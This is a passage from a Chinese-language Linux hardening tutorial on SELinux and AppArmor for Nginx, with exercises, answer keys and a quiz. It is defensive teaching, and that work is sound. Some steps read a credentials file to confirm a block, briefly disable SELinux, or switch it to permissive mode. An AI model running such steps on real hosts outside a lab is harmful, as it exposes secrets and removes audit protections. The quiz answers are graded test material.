3. **SELinux 非標準埠**：讓 Nginx 聽 `tcp/9443`。
   找出被擋的 AVC、判斷 `tclass` 與 `denied` 動作，用 `semanage port` 修復。
   額外題：如果 9443 已經被別的型別佔用，你會怎麼處理？

4. **AppArmor profile 實作**：在 Ubuntu 上為 Nginx 寫一份 profile，
   要求：能讀 `/data/www`、能寫 `/var/log/nginx`、**不能讀 `/data/backup`**。
   用 complain 模式跑一輪 `aa-logprof`，再切 enforce，最後驗證 backup 確實讀不到。

5. **錯誤修復的代價**：把第 2 題的環境改成 `SELINUX=disabled`，
   列出至少五項因此失去的保護，並實際示範其中兩項
   （例如：敏感檔案變成可讀、AVC 紀錄消失）。做完把環境正確還原。

6. **排錯情境**：某台 Rocky 9 的 Nginx 反向代理到 `127.0.0.1:8000` 的
   Node.js 應用，回 502，錯誤日誌是
   `connect() to 127.0.0.1:8000 failed (13: Permission denied) while connecting to upstream`。
   寫出你的排查順序（至少四步），以及最可能的解法與指令。

> [!question]- 練習解答
>
> **第 1 題** — 關鍵在對照組。
> DAC 測試 `sudo -u www-data cat /data/secret.txt` 會**成功**（檔案就是它的）；
> MAC 測試 `sudo runcon -t httpd_t cat /data/secret.txt`（SELinux）
> 或 `sudo aa-exec -p nginx -- cat /data/secret.txt`（AppArmor）會**失敗**。
> 日誌分別在 `ausearch -m AVC -ts recent` 與 `journalctl -k | grep DENIED`。
> ★★★★★ 結論要寫出來：**DAC 判斷「使用者是誰」，MAC 判斷「程式是什麼」**，
> 攻擊者接管 Nginx 之後，前者放行、後者攔下。
>
> **第 2 題** — 完整指令序列：
> ```bash
> sudo ausearch -m AVC -ts recent -c nginx -i | tail -3
> ls -Zd /srv/site                       # 應該是 default_t
> sudo semanage fcontext -a -t httpd_sys_content_t "/srv/site(/.*)?"
> sudo restorecon -Rv /srv/site
> sudo semanage fcontext -l | grep /srv/site
> ```
> ★★★★ 重開機後再跑一次 `ls -Zd /srv/site` 與 `curl`，確認仍然正確 ——
> 這一步就是「`chcon` 和 `semanage` 的差別」的實證。
> 若你只用 `chcon`，`restorecon -Rv /srv/site` 一跑標籤就退回 `default_t`。
>
> **第 3 題** —
> ```bash
> sudo ausearch -m AVC -ts recent -i | grep name_bind
> # tclass=tcp_socket, denied { name_bind } → 埠問題
> sudo semanage port -a -t http_port_t -p tcp 9443
> sudo systemctl restart nginx && sudo ss -lntp | grep 9443
> ```
> 額外題：`-a` 會回 `ValueError: Port tcp/9443 already defined`。
> 這時先 `semanage port -l | grep -w 9443` 看它屬於哪個型別、
> 判斷原本的服務是否還在用，再決定用 `-m` 改掉或換一個埠。
> ★★★ 直接 `-m` 改掉別人的埠是有風險的。
>
> **第 4 題** — Profile 骨架見「Part B：B-2」。關鍵是**不要**寫任何涵蓋
> `/data/backup` 的規則（AppArmor 是白名單，沒寫就是拒絕，不需要寫 deny）。
> 驗證：`sudo aa-exec -p nginx -- cat /data/backup/db-credentials.txt`
> 應該得到 `Permission denied`，同時 `journalctl -k` 出現對應的 DENIED。
> ★★★★ 常見失分點：只寫 `/data/www/** r,` 沒寫 `/data/www/ r,`，
> 導致列目錄或 `stat` 被擋。
>
> **第 5 題** — 五項參考「Part A：A-6」的表格：
> 檔案存取限制、網路外連限制、埠綁定限制、AVC 稽核紀錄、
> 其他所有服務（MySQL／SSH／cron）的保護、法規符合性、復原成本。
> 實際示範建議選「敏感檔案變可讀」與「AVC 紀錄消失」——
> 後者最有說服力：`ausearch -m AVC -ts recent` 完全沒有輸出，
> 意思是**被入侵時你什麼都查不到**。
> ★★★★★ 還原一定要走 `permissive` + `/.autorelabel` + reboot 的順序，
> 直接改回 enforcing 重開機會出大事。
>
> **第 6 題** — 排查順序：
> ① 確認後端真的活著：`curl -s http://127.0.0.1:8000/` 在本機直接測。
> ② 確認是不是 MAC：`sudo setenforce 0` 再測一次 → 好了就切回 `setenforce 1`。
> ③ 看 AVC：`sudo ausearch -m AVC -ts recent -c nginx -i`，
> 預期看到 `denied { name_connect }`、`tclass=tcp_socket`。
> ④ 判斷解法：`getsebool httpd_can_network_connect` 應該是 off。
> 解法：`sudo setsebool -P httpd_can_network_connect on`。
> ★★★★ 如果後端只是本機的資料庫，用 `httpd_can_network_connect_db` 範圍更小；
> 但這題是 Node.js 應用（8000 不是 DB 埠），所以要用前者，
> 或用 `semanage port -a -t http_port_t -p tcp 8000` 把 8000 標成 http 埠
> 這個範圍更精準的做法。
> ★★★★★ 錯誤示範：跑 `audit2allow` 產生一條 `allow httpd_t self:tcp_socket ...`
> 之類的模組 —— 有現成布林值時不該自己造模組。

## 小測驗

Q1. （簡答）用一句話說明 DAC 和 MAC 各自回答的是什麼問題。

Q2. （是非）把網站目錄設成 `chmod 750` 且擁有者是 `www-data`，
就能防止 Nginx 被入侵後讀走其他 `www-data` 可讀的檔案。

Q3. 「這行指令會發生什麼」：
```bash
sudo chcon -t httpd_sys_content_t /data/www/index.html
```
以及一週後有人跑了 `sudo restorecon -Rv /data`，結果會怎樣？

Q4. （選擇）Nginx 反向代理到後端 app 出現 502，
錯誤是 `connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream`。
最可能的原因與解法是？
(A) 檔案標籤錯，用 `restorecon`
(B) 布林值 `httpd_can_network_connect` 是 off，用 `setsebool -P` 開啟
(C) 埠標籤錯，用 `semanage port -a`
(D) 防火牆擋了，用 `firewall-cmd` 開放

Q5. （簡答）AVC 紀錄裡的 `tcontext` 顯示 `default_t`，這通常代表什麼？
應該用哪一個工具修復，又**不該**用哪一個？

Q6. （是非）`setenforce 0` 和把 `/etc/selinux/config` 改成 `SELINUX=disabled`，
效果是一樣的。

Q7. （選擇）在 Ubuntu 上跑 `aa-status`，顯示「41 profiles are loaded、33 in enforce mode」。
下列敘述何者正確？
(A) 系統上所有服務都被 AppArmor 保護了
(B) 至少 33 個程序正在被強制限制
(C) 不能據此判斷 Nginx 有沒有被保護，要另外用 `aa-unconfined` 確認
(D) 表示 8 個服務被停用了

Q8. AppArmor profile 裡寫了 `/data/www/** r,` 卻仍然無法列出目錄內容，為什麼？怎麼修？

Q9. （簡答）`aa-logprof` 幫你整理出一條「允許 nginx 讀 `/etc/shadow`」的建議，
你應該按什麼鍵？為什麼會出現這一條？

Q10. （簡答）某機關的稽核報告寫「該主機 SELinux 為 disabled」。
除了「不符基準」之外，實際上還失去了哪三項具體的東西？
其中哪一項在資安事件調查時傷害最大？

> [!question]- 測驗答案
>
> **Q1** — DAC 回答「**這個使用者**可不可以存取這個檔案」（依擁有者與 rwx）；
> MAC 回答「**這支程式**被允許做什麼」（依集中定義的政策）。
> 兩個都要過才放行，MAC 只會收窄不會放寬。
> 對應段落：「DAC：傳統權限模型」與「MAC：換一個問題來問」。★★★★
>
> **Q2** — **非**。攻擊者透過 Nginx 的漏洞執行程式碼時，**他就是 `www-data`**，
> DAC 對他不是障礙而是通行證。要擋住這種橫向讀取必須靠 MAC。
> 對應段落：「DAC 的極限」的 danger 區塊、實戰 A-5。★★★★★
>
> **Q3** — 這行會把該檔案的標籤**暫時**改成 `httpd_sys_content_t`，網站馬上就通了。
> 但它沒有改「這個路徑應該是什麼標籤」的規則，
> 所以一週後 `restorecon -Rv /data` 會依照政策把它**還原成 `default_t`**，
> 網站在沒有人改動任何東西的情況下突然 403。
> 正解是 `semanage fcontext -a -t httpd_sys_content_t "/data/www(/.*)?"` 再 `restorecon`。
> 對應段落：「修正標籤的兩個指令」的 warning、排錯表第 4 列。★★★★★
>
> **Q4** — **(B)**。`13: Permission denied` 出現在 **connecting to upstream**
> 而不是 open file，且是 root 執行的程序 —— 這是 SELinux 阻擋主動外連的典型症狀。
> 解法 `sudo setsebool -P httpd_can_network_connect on`
> （只連資料庫時可用範圍更小的 `httpd_can_network_connect_db`）。
> (A) 是檔案問題不是連線問題；(C) 是綁定監聽埠的問題（`name_bind`）；
> (D) 防火牆問題訊息通常是 timeout 或 connection refused，不是 permission denied。
> 對應段落：「布林值」的 note、排錯表第 3 列。★★★★★
>
> **Q5** — `default_t` 是「沒有任何 fcontext 規則涵蓋到這個路徑」時的預設標籤，
> 代表**標籤沒設對**，而不是政策缺規則。
> 應該用 `semanage fcontext -a` + `restorecon` 修復；
> **不該**用 `audit2allow` —— 那會產生
> `allow httpd_t default_t:file ...`，等於開放整個系統上所有未標記的檔案。
> 對應段落：「用 `audit2allow` 產生政策模組」的 danger 區塊。★★★★★
>
> **Q6** — **非**。`setenforce 0` 是切到 **permissive**：政策仍載入、
> 違規動作放行但**仍然記錄 AVC**，重開機恢復 enforcing。
> `SELINUX=disabled` 是**完全不載入政策**：沒有限制、**也沒有任何日誌**，
> 而且新建的檔案不會有標籤，之後要切回來必須全碟重新標記。
> 對應段落：「三種模式」表與其後的 danger 區塊。★★★★★
>
> **Q7** — **(C)**。`aa-status` 的數字是「載入了幾個 profile」，
> 不代表你在意的服務有被涵蓋。Ubuntu 的 nginx 套件在多數版本裡
> 沒有預設啟用的 profile，Nginx 常常是 unconfined 的。
> 必須用 `aa-unconfined` 逐項確認哪些網路程式 `not confined`。
> (B) 錯在混淆了「profile 數」與「process 數」（`aa-status` 兩者分開列）。
> 對應段落：「AppArmor 基礎操作」與實戰 B-1 的 warning。★★★★★
>
> **Q8** — 因為 `**` 只涵蓋目錄**底下**的東西，不涵蓋 `/data/www` 這個目錄本身。
> 列目錄、`stat` 目錄需要對目錄本體的讀權限。
> 修法是同時加上結尾有斜線的那一條：
> ```text
> /data/www/ r,
> /data/www/** r,
> ```
> 改完要 `sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx`。
> 對應段落：場景一的 AppArmor 版、排錯表第 10 列。★★★★
>
> **Q9** — 應該按 **`D`（Deny）或 `I`（Ignore）**，絕對不是 `A`。
> 會出現這一條代表：在 complain 模式期間，
> **真的有東西以 nginx 的身分嘗試讀 `/etc/shadow`** ——
> 正常的 Nginx 永遠不會做這件事，所以這台機器很可能**已經被入侵**。
> 正確處置是按 D，然後啟動資安事件調查
> （見 [[090-07-15-guide-資安實踐-被入侵主機的跡證檢查]]）。
> 對應段落：「用 `aa-logprof` 產生規則」的 danger 區塊。★★★★★
>
> **Q10** — 三項（任舉三個）：
> ① 檔案存取限制消失 —— 服務被入侵後可讀該帳號可讀的一切（如資料庫備份、憑證私鑰）；
> ② 網路外連限制消失 —— 反向 shell、對內網橫向掃描不再被擋；
> ③ **AVC 稽核紀錄完全消失**；
> ④ 不只該服務，系統上所有服務（MySQL／SSH／cron）的 MAC 保護一起沒了；
> ⑤ 要切回來必須全碟重新標記 ＋ 重開機，是一次停機作業。
>
> **調查時傷害最大的是第 ③ 項。** enforcing 或 permissive 至少會留下 AVC，
> 事後能重建「攻擊者試圖存取什麼」的軌跡；
> disabled 之下這些紀錄從一開始就不存在，鑑識時等於沒有這一層證據。
> 對應段落：實戰 A-6 的表格。★★★★★

## 延伸閱讀

**基礎**

- [[020-01-08-cmd-Linux-檔案權限與擁有者]] — DAC 的完整說明
- [[020-01-09-cmd-Linux-使用者與群組管理]] — 服務帳號的建立與管理
- [[020-01-17-cmd-Linux-systemd服務管理]] — unit drop-in 與沙箱選項
- [[020-01-19-guide-Linux-日誌系統]] — journald 與 kernel 日誌
- [[020-01-25-guide-Linux-開機流程與GRUB救援]] — SELinux 改壞開不起來時的救援

**同章其他篇**

- [[090-02-01-guide-防護-伺服器初始安全設定]] — 新機加固的第一批動作
- [[090-02-02-guide-防火牆-ufw基礎與實務]] — 網路層的另一道防線
- [[090-02-04-guide-防火牆-firewalld]] — RHEL 系防火牆
- [[090-02-06-guide-防護-遠端存取安全]] — 進得來的路怎麼管
- [[090-02-08-guide-防護-系統強化與稽核]] — auditd 規則與整體加固

**應用與 Web**

- [[060-02-02-02-guide-Nginx-設定語法與虛擬主機]] — 本篇範例用到的 Nginx 設定
- [[060-02-02-04-guide-Nginx-反向代理與負載平衡]] — `httpd_can_network_connect` 的使用情境
- [[060-02-02-09-guide-Nginx-安全設定]] — Nginx 自身的加固
- [[090-03-02-guide-應用安全-應用層安全]] — MAC 擋不到的那一層
- [[090-05-04-guide-資安設備-Web應用防火牆WAF]] — 擋在應用前面的一層

**合規與監控**

- [[090-06-03-guide-TWGCB-Linux項目分類詳解]] — 基準對 MAC 的要求
- [[090-06-08-guide-TWGCB-Linux誤判與服務衝突處理]] — 基準要求與服務衝突時怎麼辦
- [[090-08-09-guide-Wazuh-自訂規則與解碼器]] — 把 AVC／DENIED 做成告警
- [[090-08-06-guide-Wazuh-SCA安全組態評估]] — 自動檢查 MAC 是否啟用
- [[100-01-02-guide-日誌-日誌集中與輪替]] — 拒絕紀錄的集中保存
- [[090-07-15-guide-資安實踐-被入侵主機的跡證檢查]] — AVC 在鑑識中的用途

**自動化**

- [[020-02-03-06-guide-標準化-Ansible實戰inventory與playbook]] — 把 MAC 設定寫成程式碼
- [[020-02-03-02-ref-標準化-基準設定與範本化]] — 讓每台新機都一致
